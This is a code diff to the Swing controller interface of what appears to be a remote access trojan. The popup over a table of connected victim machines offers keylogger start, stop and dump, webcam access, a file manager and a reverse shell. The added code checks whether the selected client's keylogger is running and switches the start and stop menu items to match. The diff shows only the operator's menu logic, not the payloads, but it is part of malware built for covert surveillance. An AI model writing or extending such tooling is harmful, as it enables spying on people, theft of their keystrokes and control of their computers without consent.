@@ -1,7 +1,9 @@
 package GUI.TableUtils.Configuration;
 
+import Connections.ClientErrorHandler;
 import Connections.Streams;
 import GUI.JsGUI;
+import GUI.Main;
 import GUI.TableUtils.FileManager.Listener.FileManagerMenuListener;
 import GUI.TableUtils.KeyLogger.KeyLoggerMenuListener;
 import GUI.TableUtils.KeyLogger.KeyloggerEvents;
@@ -9,8 +11,11 @@ import GUI.TableUtils.ReverseShell.ReverseShellMenuListener;
 import GUI.TableUtils.Webcam.WebcamMenuListener;
 
 import javax.swing.*;
+import javax.swing.event.MenuEvent;
+import javax.swing.event.MenuListener;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
+import java.io.IOException;
 import java.net.Socket;
 import java.util.concurrent.ConcurrentHashMap;
 
@@ -61,6 +66,41 @@ public class TablePopUpListener extends MouseAdapter {
         webcamMenu.addActionListener(new WebcamMenuListener(connectionsTable, mapOfConnections, mainGUI));
         fileManagerMenu.addActionListener(new FileManagerMenuListener(connectionsTable, mapOfConnections, mainGUI));
         reverseShellMenu.addActionListener(new ReverseShellMenuListener(connectionsTable, mapOfConnections, mainGUI));
+        keyloggerMenuOptions.addMenuListener(new MenuListener() {
+            @Override
+            public void menuSelected(MenuEvent e) {
+                Streams stream = GetSYS.getStream(mapOfConnections, Main.gui.getConnectionsTable());
+                stream.getExecutor().submit(new Runnable() {
+                    @Override
+                    public void run() {
+                        Boolean stateOfKeylogger = false;
+                        try {
+                            String state = stream.sendAndReadJSONX(KeyloggerEvents.STATE);
+                            stateOfKeylogger = Boolean.parseBoolean(state);
+                        } catch (IOException ex) {
+                            new ClientErrorHandler("Error xd", stream.getClientSocket());
+                        }
+                        if (stateOfKeylogger) {
+                            startKeyloggerMenu.setVisible(false);
+                            stopKeyloggerMenu.setVisible(true);
+                        } else {
+                            startKeyloggerMenu.setVisible(true);
+                            stopKeyloggerMenu.setVisible(false);
+                        }
+                    }
+                });
+            }
+
+            @Override
+            public void menuDeselected(MenuEvent e) {
+
+            }
+
+            @Override
+            public void menuCanceled(MenuEvent e) {
+
+            }
+        });
         startKeyloggerMenu.addActionListener(new KeyLoggerMenuListener(connectionsTable, mapOfConnections, KeyloggerEvents.START));
         stopKeyloggerMenu.addActionListener(new KeyLoggerMenuListener(connectionsTable, mapOfConnections, KeyloggerEvents.STOP));
         dumpLogsMenu.addActionListener(new KeyLoggerMenuListener(connectionsTable, mapOfConnections, KeyloggerEvents.DUMP));
